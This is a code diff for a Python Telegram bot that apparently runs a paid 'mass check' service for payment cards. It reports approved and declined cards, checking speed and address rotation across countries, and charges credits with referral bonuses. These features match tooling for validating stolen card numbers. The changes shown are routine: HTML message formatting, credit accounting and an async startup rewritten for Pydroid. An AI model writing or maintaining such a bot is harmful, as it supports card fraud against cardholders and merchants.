@@ -2027,23 +2471,23 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
     user = await get_user(user_id)
     
     # Send summary
-    summary_text = f"""*🎯 MASS CHECK COMPLETE*
+    summary_text = f"""<b>🎯 MASS CHECK COMPLETE</b>
 ══════════════════════
-*Statistics:*
+<b>Statistics:</b>
 • Total Cards: {len(cards)}
 • ✅ Approved: {approved}
 • ❌ Declined: {declined}
 • Success Rate: {success_rate:.1f}%
-• Credits Used: {processed}
+• Credits Used: {credits_used} (only for actual checks)
 • Time Taken: {elapsed:.1f}s
 • Speed: ⚡ {len(cards)/elapsed:.1f} cards/second
 
-*Your Balance:* {user['credits']} credits
+<b>Your Balance:</b> {user.get('credits', 0)} credits
 ══════════════════════
 """
     
     try:
-        await status_msg.edit_text(summary_text, parse_mode=ParseMode.MARKDOWN)
+        await status_msg.edit_text(summary_text, parse_mode=ParseMode.HTML)
     except Exception:
         pass
     
@@ -2189,12 +2633,17 @@ async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.MARKDOWN
     )
 
-def main():
+async def main():
     """Start the bot"""
-    # Initialize database before starting bot
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(init_database())
+    print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")
     
+    if not firebase_connected:
+        print("⚠️  Using in-memory storage instead")
+        print("⚠️  NOTE: Data will be lost when bot restarts!")
+    else:
+        print("✅ Firebase connected successfully")
+    
+    # Create application with Pydroid-compatible settings
     application = Application.builder().token(BOT_TOKEN).build()
     
     # Add error handler
@@ -2247,8 +2696,7 @@ def main():
     # Must be added LAST to catch all other commands
     application.add_handler(MessageHandler(filters.COMMAND, unknown_command))
     
-    # Start bot
-    print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")
+    # Start bot with Pydroid-compatible settings
     print(f"⚡ Speed: 5 cards/second")
     print(f"📍 Address Rotation: Enabled (US, UK, CA, IN, AU)")
     print(f"🤝 Invite & Earn: 50 credits per referral")
@@ -2256,7 +2704,37 @@ def main():
     print(f"🔐 Admin Commands: {len(ADMIN_IDS)} admin(s)")
     print("✅ Bot is running...")
     
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    # Start polling with Pydroid-compatible settings
+    await application.initialize()
+    await application.start()
+    
+    try:
+        await application.updater.start_polling()
+        # Keep the bot running
+        while True:
+            await asyncio.sleep(3600)  # Sleep for 1 hour
+    except asyncio.CancelledError:
+        pass
+    finally:
+        await application.stop()
+        await application.shutdown()
+
+def start_bot():
+    """Start the bot for Pydroid 3 compatibility"""
+    try:
+        # Create a new event loop for Pydroid
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        # Run the bot
+        loop.run_until_complete(main())
+    except KeyboardInterrupt:
+        print("\n🛑 Bot stopped by user")
+    except Exception as e:
+        print(f"❌ Bot crashed: {e}")
+        import traceback
+        traceback.print_exc()
 
 if __name__ == "__main__":
-    main()
+    print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")
+    start_bot()
